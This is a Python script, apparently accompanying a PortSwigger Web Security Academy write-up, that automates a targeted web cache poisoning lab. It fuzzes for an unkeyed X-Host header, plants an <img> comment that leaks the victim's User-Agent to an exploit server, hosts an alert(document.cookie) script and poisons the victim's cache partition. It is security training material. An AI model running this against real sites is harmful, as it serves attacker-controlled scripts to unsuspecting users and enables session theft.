#!/usr/bin/env python3
"""
Targeted web cache poisoning using an unknown header
PortSwigger Web Security Academy -- Web Cache Poisoning

Companion script for the writeup: 04-targeted-unknown-header.md

What this does:
    Fuzzes a wider header candidate list to find X-Host (past the usual
    X-Forwarded-* suspects), confirms Vary: User-Agent splits the cache per
    client, posts a blog comment containing an <img> tag pointed at the
    exploit server to capture the simulated victim's exact User-Agent from
    its access log, then poisons the cache partition matching that specific
    User-Agent so only that victim receives the payload.

Usage:
    python 04-targeted-unknown-header.py <lab-url> <exploit-server-url>
    e.g. python 04-targeted-unknown-header.py https://0a1b...web-security-academy.net https://exploit-0a1c....exploit-server.net

Requirements:
    pip install httpx
"""

import asyncio
import re
import secrets
import sys
from urllib.parse import urlparse
import httpx

EXTENDED_HEADERS = [
    "X-Forwarded-Host", "X-Host", "X-Forwarded-Server", "X-Original-URL",
    "X-Rewrite-URL", "X-Forwarded-Scheme", "X-Forwarded-Proto",
    "X-Forwarded-Port", "X-Forwarded-Prefix", "X-Original-Host",
    "Forwarded", "X-Custom-IP-Authorization",
    "X-Backend-Host", "X-Proxy-Host", "X-Forwarded-For", "X-Real-IP",
    "CF-Connecting-IP", "True-Client-IP",
]


def _cache_buster() -> str:
    return secrets.token_hex(4)


def _is_cache_miss(headers: dict) -> bool:
    xc = headers.get("x-cache", "").lower()
    cf = headers.get("cf-cache-status", "").lower()
    return "miss" in xc or "miss" in cf


async def _lab_solved(client: httpx.AsyncClient, url: str) -> bool:
    r = await client.get(url)
    return "congratulations" in r.text.lower() or "is-solved" in r.text.lower()


async def exploit_server_store(client: httpx.AsyncClient, exploit_server: str,
                                file_path: str, body: str,
                                head: str = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8") -> bool:
    store_url = f"{exploit_server.rstrip('/')}/store"
    data = {
        "urlIsHttps": "on",
        "responseFile": file_path,
        "responseHead": head,
        "responseBody": body,
    }
    r = await client.post(store_url, data=data, follow_redirects=True)
    verify = await client.get(f"{exploit_server.rstrip('/')}{file_path}")
    if verify.status_code == 200 and body in verify.text:
        return True
    return body[:20] in verify.text if verify.text else False


async def solve(lab_url: str, exploit_server: str) -> None:
    exploit_host = urlparse(exploit_server).hostname

    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15) as client:
        # Step 1: fuzz past the well-known X-Forwarded-* candidates.
        print("[*] Fuzzing for unkeyed headers...")
        canary = f"canary{secrets.token_hex(3)}"
        reflected_header = None
        for hdr in EXTENDED_HEADERS:
            r = await client.get(f"{lab_url}/?cb={_cache_buster()}", headers={hdr: canary})
            if canary in r.text:
                reflected_header = hdr
                print(f"[+] Found reflected unkeyed header: {hdr}")
                break
        if not reflected_header:
            print("[-] No reflected header found -- cannot proceed")
            return

        # Step 2: confirm the cache is split per User-Agent.
        r = await client.get(f"{lab_url}/?cb={_cache_buster()}")
        vary = r.headers.get("vary", "")
        print(f"[*] Vary header: {vary}")
        if "user-agent" not in vary.lower():
            print("[!] Vary does not include User-Agent -- this script assumes it does")

        # Step 3: post a comment with a UA-logging <img> tag.
        r = await client.get(lab_url)
        post_links = re.findall(r'href="(/post\?postId=\d+)"', r.text)
        if not post_links:
            print("[-] No blog posts found -- cannot proceed")
            return

        post_url = f"{lab_url}{post_links[0]}"
        post_id = re.search(r'postId=(\d+)', post_links[0]).group(1)
        print(f"[*] Posting UA-logging comment on {post_url}")

        r = await client.get(post_url)
        csrf = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
        if not csrf:
            print("[-] No CSRF token found on post page -- cannot proceed")
            return

        comment_data = {
            "csrf": csrf.group(1),
            "postId": post_id,
            "comment": f'<img src="{exploit_server}/ua-log">',
            "name": "test",
            "email": "test@test.com",
            "website": "",
        }
        await client.post(f"{lab_url}/post/comment", data=comment_data)
        print("[+] UA-logging comment posted")

        # Step 4: poll the exploit server's log for the victim's User-Agent.
        print("[*] Waiting for victim UA in exploit server logs...")
        victim_ua = None
        for wait_cycle in range(6):
            await asyncio.sleep(5)
            log_r = await client.get(f"{exploit_server}/log")
            ua_matches = re.findall(
                r'ua-log[^"]*"[^"]*"user-agent:\s*([^"]+)"', log_r.text, re.I
            )
            if not ua_matches:
                ua_matches = re.findall(r'user-agent:\s*([^\n<"]+)', log_r.text, re.I)
            ua_matches = [ua for ua in ua_matches if "python" not in ua.lower() and "httpx" not in ua.lower()]
            if ua_matches:
                victim_ua = ua_matches[-1].strip()
                victim_ua = victim_ua.replace("&quot;", '"').replace("&amp;", "&").replace("&lt;", "<").replace("&gt;", ">")
                print(f"[+] Victim User-Agent: {victim_ua}")
                break
            print(f"    ... waiting ({(wait_cycle + 1) * 5}s)")

        if not victim_ua:
            print("[-] Could not discover victim's User-Agent from logs -- cannot proceed")
            return

        # Step 5: host the payload.
        stored = await exploit_server_store(
            client, exploit_server, "/resources/js/tracking.js", "alert(document.cookie)",
            head="HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8",
        )
        print("[+] alert(document.cookie) stored at /resources/js/tracking.js" if stored
              else "[!] Warning: exploit store may have failed -- continuing anyway")

        # Step 6: poison the cache partition matching the victim's exact UA.
        print("[*] Starting poison + re-poison loop targeted at the victim's UA...")
        for cycle in range(30):
            r = await client.get(lab_url, headers={
                reflected_header: exploit_host,
                "User-Agent": victim_ua,
            })
            if _is_cache_miss(dict(r.headers)):
                verify = await client.get(lab_url, headers={"User-Agent": victim_ua})
                if exploit_host in verify.text:
                    print(f"[+] Cache poisoned for victim UA (cycle {cycle + 1})")

            if await _lab_solved(client, lab_url):
                print("[+] Lab solved.")
                return
            await asyncio.sleep(3)

    print("[-] Not solved after all re-poison cycles")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python {sys.argv[0]} <lab-url> <exploit-server-url>")
        sys.exit(1)
    asyncio.run(solve(sys.argv[1].rstrip("/"), sys.argv[2].rstrip("/")))
